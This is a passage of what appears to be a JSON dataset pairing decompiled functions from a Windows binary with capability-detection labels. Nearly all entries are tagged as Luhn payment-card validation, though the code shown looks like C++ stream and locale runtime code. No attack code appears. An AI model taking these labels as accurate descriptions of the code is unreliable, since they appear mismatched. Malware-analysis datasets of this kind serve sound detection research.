-1;\n        if (-1 < iVar8) {\n            do {\n                iVar8 = iVar8 + -1;\n                *puVar7 = 0;\n                puVar7[1] = 0;\n                puVar7 = puVar7 + 2;\n            } while (iVar8 != -1);\n        }\n    }\n    iVar8 = *(uStack24 + 0x18);\n    if (iVar8 != 0) {\n        if (*0x4f59f4 == 0) {\n            *(iVar8 + 0xc) = *(iVar8 + 0xc) + 1;\n        }\n        else {\n            LOCK();\n            *(iVar8 + 0xc) = *(iVar8 + 0xc) + 1;\n        }\n    }\n    in_stack_ffffff98 = 0;\n    fcn.0049a2e0();\n    iVar4 = *(extraout_ECX_00 + 0x68);\n    if (iVar4 != extraout_ECX_00 + 0x24) {\n        if (iVar4 != 0) {\n            fcn.004a34b0(iVar4);\n        }\n        *(extraout_ECX_00 + 0x68) = 0;\n    }\n    fcn.0049a360();\n    iVar4 = *(uStack24 + 100);\n    *(extraout_ECX_00 + 0x18) = iVar8;\n    if (0 < iVar4) {\n        iVar8 = *(uStack24 + 0x68);\n        iVar9 = 0;\n        do {\n            uVar5 = *(iVar8 + 4 + iVar9);\n            *(iStack80 + iVar9) = *(iVar8 + iVar9);\n            *(iStack80 + 4 + iVar9) = uVar5;\n            iVar9 = iVar9 + 8;\n        } while (iVar9 != iVar4 * 8);\n    }\n    *(extraout_ECX_00 + 0x68) = iStack80;\n    uVar5 = *(uStack24 + 0xc);\n    *(extraout_ECX_00 + 100) = iVar4;\n    cVar1 = *(uStack24 + 0x76);\n    *(extraout_ECX_00 + 0xc) = uVar5;\n    *(extraout_ECX_00 + 8) = *(uStack24 + 8);\n    *(extraout_ECX_00 + 4) = *(uStack24 + 4);\n    *(extraout_ECX_00 + 0x70) = *(uStack24 + 0x70);\n    if (cVar1 == '\\0') {\n        if (*(uStack24 + 0x7c) != NULL) {\n            uVar6 = (**(**(uStack24 + 0x7c) + 0x28))(0x20);\n            *(uStack24 + 0x76) = 1;\n            cVar1 = *(extraout_ECX_00 + 0x76);\n            *(uStack24 + 0x74) = uVar6;\n            goto joined_r0x0049d114;\n        }\n    }\n    else {\n        cVar1 = *(extraout_ECX_00 + 0x76);\n        uVar6 = *(uStack24 + 0x74);\njoined_r0x0049d114:\n        if (cVar1 != '\\0') {\ncode_r0x0049d036:\n            *(extraout_ECX_00 + 0x74) = uVar6;\n            fcn.0048f500(uStack24 + 0x6c);\n            fcn.0048f670(auStack64);\n            fcn.0048f620();\n            fcn.0049cbb0(extraout_ECX_00 + 0x6c);\n            fcn.0049a2e0(2);\n            *(extraout_ECX_00 + 0x10) = *(uStack24 + 0x10);\n            fcn.0049ce20(*(extraout_ECX_00 + 0x14));\n            return extraout_ECX_00;\n        }\n        if (*(extraout_ECX_00 + 0x7c) != NULL) {\n            (**(**(extraout_ECX_00 + 0x7c) + 0x28))(0x20);\n            *(extraout_ECX_00 + 0x76) = 1;\n            goto code_r0x0049d036;\n        }\n    }\n    fcn.0049e780();\ncode_r0x0049ce20:\n    fcn.004a3c30();\n    in_stack_ffffff98 = in_stack_ffffff98 | *(extraout_ECX_01 + 0x14);\n    if (*(extraout_ECX_01 + 0x78) == 0) {\n        in_stack_ffffff98 = in_stack_ffffff98 | 1;\n    }\n    *(extraout_ECX_01 + 0x14) = in_stack_ffffff98;\n    if ((*(extraout_ECX_01 + 0x10) & in_stack_ffffff98) != 0) {\n        fcn.0049e910(\"basic_ios::clear\");\n        fcn.0048f500(iStack132 + 0x6c);\n        fcn.0049ab80(iStack132, uStack128);\n        fcn.0048f620();\n        fcn.0049cbb0(uStack128);\n        piVar2 = *(iStack132 + 0x78);\n        if (piVar2 != NULL) {\n            fcn.0048f500(piVar2 + 7);\n            (**(*piVar2 + 8))(uStack128);\n            fcn.0048f670(uStack128);\n            fcn.0048f620();\n        }\n        return extraout_ECX;\n    }\n    return in_stack_ffffff98;\n}\n",
        "token_count": 1655
    },
    "0049df90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0049df90(void)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uchar uVar5;\n    uchar uVar6;\n    \n    uVar5 = &stack0xfffffff4 < 0x10;\n    uVar6 = *0x10 == 0x1c;\n    puVar1 = sub.msvcrt.dll_setlocale();\n    iVar3 = 2;\n    puVar4 = 0x502609;\n    do {\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        uVar5 = *puVar1 < *puVar4;\n        uVar6 = *puVar1 == *puVar4;\n        puVar1 = puVar1 + 1;\n        puVar4 = puVar4 + 1;\n    } while (uVar6);\n    if ((!uVar5 && !uVar6) == uVar5) {\n        uVar2 = fcn.0041e9b0();\n        return uVar2;\n    }\n    sub.msvcrt.dll_strlen();\n    fcn.004a34e0();\n    sub.msvcrt.dll_memcpy();\n    sub.msvcrt.dll_setlocale();\n    uVar2 = fcn.0041e9b0();\n    sub.msvcrt.dll_setlocale();\n    fcn.004a34b0();\n    return uVar2;\n}\n",
        "token_count": 323
    },
    "0049e840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0049e840(uint param_1, uint param_2, uint *param_3)\n\n{\n    fcn.0049f020(param_1, param_2, *param_3, param_3[1]);\n    return;\n}\n",
        "token_count": 57
    },
    "0049e880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.0049e880(uint param_1, uint param_2, int32_t *param_3)\n\n{\n    fcn.0049f020(param_1, param_2, *param_3, *(*param_3 + -0xc));\n    return;\n}\n",
        "token_count": 62
    },
    "0049e8f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0049e8f0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004a3950();\n    return *(iVar1 + 4) & 0xffffff00 | *(iVar1 + 4) != 0;\n}\n",
        "token_count": 63
    },
    "0049fb50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0049fb50(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = fcn.00432500();\n    uVar4 = 0;\n    puVar1 = *param_1 + 8;\n    if ((uVar3 <= *puVar1 && *puVar1 != uVar3) && (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 != 0)) {\n        uVar3 = fcn.004a3c60(iVar2, 0x506e70, 0x50756c, 0);\n        uVar4 = uVar3 & 0xffffff00 | uVar3 != 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 201
    },
    "0049fba0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0049fba0(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = fcn.00432500();\n    uVar4 = 0;\n    puVar1 = *param_1 + 8;\n    if ((uVar3 <= *puVar1 && *puVar1 != uVar3) && (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 != 0)) {\n        uVar3 = fcn.004a3c60(iVar2, 0x506e70, 0x50758c, 0);\n        uVar4 = uVar3 & 0xffffff00 | uVar3 != 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 202
    },
    "0049fbf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0049fbf0(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = fcn.00432500();\n    uVar4 = 0;\n    puVar1 = *param_1 + 8;\n    if ((uVar3 <= *puVar1 && *puVar1 != uVar3) && (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 != 0)) {\n        uVar3 = fcn.004a3c60(iVar2, 0x506e70, 0x5075b0, 0);\n        uVar4 = uVar3 & 0xffffff00 | uVar3 != 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 203
    },
    "0049fc40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0049fc40(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = fcn.00432500();\n    uVar4 = 0;\n    puVar1 = *param_1 + 8;\n    if ((uVar3 <= *puVar1 && *puVar1 != uVar3) && (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 != 0)) {\n        uVar3 = fcn.004a3c60(iVar2, 0x506e70, 0x5075bc, 0);\n        uVar4 = uVar3 & 0xffffff00 | uVar3 != 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 201
    },
    "0049fd30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0049fd30(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = fcn.00432500();\n    uVar4 = 0;\n    puVar1 = *param_1 + 8;\n    if ((uVar3 <= *puVar1 && *puVar1 != uVar3) && (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 != 0)) {\n        uVar3 = fcn.004a3c60(iVar2, 0x506e70, 0x5075e0, 0);\n        uVar4 = uVar3 & 0xffffff00 | uVar3 != 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 202
    },
    "0049fd80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0049fd80(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = fcn.00432500();\n    uVar4 = 0;\n    puVar1 = *param_1 + 8;\n    if ((uVar3 <= *puVar1 && *puVar1 != uVar3) && (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 != 0)) {\n        uVar3 = fcn.004a3c60(iVar2, 0x506e70, 0x5075ec, 0);\n        uVar4 = uVar3 & 0xffffff00 | uVar3 != 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 201
    },
    "0049fdd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0049fdd0(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = fcn.00432500();\n    uVar4 = 0;\n    puVar1 = *param_1 + 8;\n    if ((uVar3 <= *puVar1 && *puVar1 != uVar3) && (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 != 0)) {\n        uVar3 = fcn.004a3c60(iVar2, 0x506e70, 0x5075f8, 0);\n        uVar4 = uVar3 & 0xffffff00 | uVar3 != 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 203
    },
    "0049fe20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0049fe20(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = fcn.00432500();\n    uVar4 = 0;\n    puVar1 = *param_1 + 8;\n    if ((uVar3 <= *puVar1 && *puVar1 != uVar3) && (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 != 0)) {\n        uVar3 = fcn.004a3c60(iVar2, 0x506e70, 0x507604, 0);\n        uVar4 = uVar3 & 0xffffff00 | uVar3 != 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 200
    },
    "004a0840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004a0840(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint arg_10h;\n    int32_t *in_stack_fffffcf4;\n    int32_t in_stack_fffffcf8;\n    int32_t *in_stack_fffffd10;\n    int32_t *in_stack_fffffd2c;\n    int32_t *in_stack_fffffd48;\n    int32_t *in_stack_fffffd64;\n    int32_t *in_stack_fffffd80;\n    int32_t *in_stack_fffffd9c;\n    int32_t *in_stack_fffffdb8;\n    int32_t *in_stack_fffffdd4;\n    int32_t *in_stack_fffffdf0;\n    int32_t *in_stack_fffffe0c;\n    int32_t *in_stack_fffffe28;\n    int32_t *in_stack_fffffe44;\n    int32_t *in_stack_fffffe60;\n    int32_t *in_stack_fffffe7c;\n    int32_t *in_stack_fffffe98;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar3 = fcn.00432500();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffe8 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5070ec, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffe8 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffcc = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50710c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffcc + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffb0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50712c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffb0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff94 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50714c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff94 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff78 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50716c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff78 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff5c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507178, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff5c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff40 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50756c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff40 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff24 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50758c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff24 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff08 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075b0, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff08 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeec = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075bc, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeec + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffed0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075c8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffed0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeb4 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075d4, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeb4 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe98 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075e0, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe98 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe98 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe7c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075ec, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe7c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe7c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe60 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075f8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe60 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe60 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe44 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507604, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe44 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe44 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe28 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507624, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe28 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe28 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe0c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507644, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe0c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe0c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffdf0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507664, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffdf0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffdf0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffdd4 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507670, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffdd4 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffdd4 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffdb8 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50767c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffdb8 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffdb8 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffd9c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50769c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffd9c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffd9c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffd80 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076bc, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffd80 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffd80 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffd64 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076c8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffd64 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffd64 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffd48 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507700, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffd48 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffd48 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffd2c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50770c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffd2c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffd2c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffd10 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507718, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffd10 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffd10 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffcf8 = 0x507724;\n        in_stack_fffffcf4 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507724, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    if (in_stack_fffffcf8 != 0) {\n        arg_10h = sub.msvcrt.dll_strlen(in_stack_fffffcf8);\n        fcn.0049e080(in_stack_fffffcf4, in_stack_fffffcf8, arg_10h);\n        return in_stack_fffffcf4;\n    }\n    fcn.0049c600(*(in_stack_fffffcf4 + *(*in_stack_fffffcf4 + -0xc) + 0x14) | 1);\n    return in_stack_fffffcf4;\n}\n",
        "token_count": 5385
    },
    "004a08a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004a08a0(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint arg_10h;\n    int32_t *in_stack_fffffd10;\n    int32_t in_stack_fffffd14;\n    int32_t *in_stack_fffffd2c;\n    int32_t *in_stack_fffffd48;\n    int32_t *in_stack_fffffd64;\n    int32_t *in_stack_fffffd80;\n    int32_t *in_stack_fffffd9c;\n    int32_t *in_stack_fffffdb8;\n    int32_t *in_stack_fffffdd4;\n    int32_t *in_stack_fffffdf0;\n    int32_t *in_stack_fffffe0c;\n    int32_t *in_stack_fffffe28;\n    int32_t *in_stack_fffffe44;\n    int32_t *in_stack_fffffe60;\n    int32_t *in_stack_fffffe7c;\n    int32_t *in_stack_fffffe98;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t 